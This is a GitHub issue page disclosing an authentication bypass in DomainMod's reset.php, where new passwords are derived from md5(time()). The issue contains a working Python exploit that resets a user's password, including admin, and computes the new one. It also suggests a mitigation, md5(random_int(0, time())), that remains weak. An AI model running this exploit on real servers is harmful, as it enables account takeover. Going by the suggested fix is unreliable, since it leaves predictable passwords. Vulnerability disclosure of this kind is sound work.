=== Content from github.com_5a2c1bb9_20250119_112734.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdomainmod%2Fdomainmod%2Fissues%2F122)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdomainmod%2Fdomainmod%2Fissues%2F122)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=domainmod%2Fdomainmod)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[domainmod](/domainmod)
/
**[domainmod](/domainmod/domainmod)**
Public

* [Notifications](/login?return_to=%2Fdomainmod%2Fdomainmod) You must be signed in to change notification settings
* [Fork
  100](/login?return_to=%2Fdomainmod%2Fdomainmod)
* [Star
   499](/login?return_to=%2Fdomainmod%2Fdomainmod)

* [Code](/domainmod/domainmod)
* [Issues
  6](/domainmod/domainmod/issues)
* [Pull requests
  1](/domainmod/domainmod/pulls)
* [Actions](/domainmod/domainmod/actions)
* [Security](/domainmod/domainmod/security)
* [Insights](/domainmod/domainmod/pulse)

Additional navigation options

* [Code](/domainmod/domainmod)
* [Issues](/domainmod/domainmod/issues)
* [Pull requests](/domainmod/domainmod/pulls)
* [Actions](/domainmod/domainmod/actions)
* [Security](/domainmod/domainmod/security)
* [Insights](/domainmod/domainmod/pulse)

# Authentication Bypass via reset.php #122

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Authentication Bypass via reset.php](#top)#122Copy linkAssignees [![gregdotca](https://avatars.githubusercontent.com/u/3948048?s=64&u=0994e9c48a3cb0541ae9fd9355233b96026d7981&v=4)](/gregdotca)Labels[enhancement](https://github.com/domainmod/domainmod/issues?q=state%3Aopen%20label%3A%22enhancement%22)![@AbhishekHerle](https://avatars.githubusercontent.com/u/5360970?v=4&size=80)
## Description

![@AbhishekHerle](https://avatars.githubusercontent.com/u/5360970?v=4&size=48)[AbhishekHerle](https://github.com/AbhishekHerle)opened [on May 2, 2020](https://github.com/domainmod/domainmod/issues/122#issue-611109561)

**Summary**:

reset.php handles “resetting”/changing an existing user’s password. The reset functionality uses PHP’s time() to derive the new password for the user that is attempting to change their password. This method of using time() to create a temporary password is very deterministic and allows an attacker to invoke the reset password functionality and reliably determine what the new password is, thus allowing for an account takeover.

**File Affected**: reset.php

**Vulnerability Details:**

1. Below is an overview of the logic used by reset.php to change a user’s password.

   [![overall_logic](https://user-images.githubusercontent.com/5360970/80855671-1f8eb400-8c11-11ea-862a-c27e9910b4b5.PNG)](https://user-images.githubusercontent.com/5360970/80855671-1f8eb400-8c11-11ea-862a-c27e9910b4b5.PNG)
2. In red is the SQL statement is used to determine the existence of a user.

    `SELECT first_name, last_name, username, email_address FROM users WHERE (username = :username OR email_address = :email_address) AND active = '1'`

   A user’s password is changed only if the above statement returns a non-empty result set. As we can see, the above SQL statement results in a row being returned if either the username or the email address exists in the database. Hence, an attacker will able to invoke a change of password (in green) as long the attacker knows a valid username.
3. Once, the user’s username (email ID) is validated, the application proceeds to change the password of the user (in green). A new/temporary password is created for the user by using the first 8 characters of the MD5 hash of the current Unix timestamp.

   `$new_password = substr(md5(time()), 0, 8);`

   An SQL statement is then used to update the user with the new password.
4. The problem with the aforementioned logic is that It is very easy for an attacker to determine the new password as the result of the time() is very deterministic and not random. Hence, this vulnerability can be exploited to change the password of a user and then reliably determine the new password. The credentials can then be used to login to the application.

   As, admin is a default user on the application, this vulnerability can be used to change the admin password and consequently login to the application as the said admin user.

**Exploit:**

The following python script can be used to reset/change a user’s password and subsequently determine the new password.

```
import time
import math
import requests
import hashlib

RESET_URL = "http://SERVER_IP/path_to_domainmod_application/reset.php?user_identifier={}"

def reset_password(username='admin'):

    seed_1 = str(math.floor(time.time())).encode('ascii')
    r = requests.get(RESET_URL.format(username))
    # Time is measured immediately after issuing the rest request just to handle edge cases of the
    # timestamp changing in between the first-time measure and the reset request
    seed_2 = str(math.floor(time.time())).encode('ascii')

    password_1 = hashlib.md5(seed_1).hexdigest()
    password_2 = hashlib.md5(seed_2).hexdigest()

    print(password_1[:8])
    print(password_2[:8])

reset_password()

```

1. Successful login using **admin:Hacker!234**

   [![original_valid_login](https://user-images.githubusercontent.com/5360970/80855683-36cda180-8c11-11ea-8a2e-2ba48421552b.PNG)](https://user-images.githubusercontent.com/5360970/80855683-36cda180-8c11-11ea-8a2e-2ba48421552b.PNG)
2. Resetting the password using the above exploit code
3. Unsuccessful login using **admin:Hacker!234**

   [![incorrect_login](https://user-images.githubusercontent.com/5360970/80855684-3f25dc80-8c11-11ea-89e5-e20f7e538b0c.PNG)](https://user-images.githubusercontent.com/5360970/80855684-3f25dc80-8c11-11ea-89e5-e20f7e538b0c.PNG)
4. Successful login using newly obtained credentials **admin:e65edd7b**

   [![new_valid_login](https://user-images.githubusercontent.com/5360970/80855688-46e58100-8c11-11ea-870b-22172be7fd46.PNG)](https://user-images.githubusercontent.com/5360970/80855688-46e58100-8c11-11ea-870b-22172be7fd46.PNG)

**Mitigation:**

One suggestion is to use a cryptographically secure random number as the seed to the md5() instead of time().

`$new_password = substr(md5(random_int(0, time())), 0, 8);`

## Metadata

### Assignees

* [![@gregdotca](https://avatars.githubusercontent.com/u/3948048?s=64&u=0994e9c48a3cb0541ae9fd9355233b96026d7981&v=4)gregdotca](/gregdotca)
### Labels

[enhancement](https://github.com/domainmod/domainmod/issues?q=state%3Aopen%20label%3A%22enhancement%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


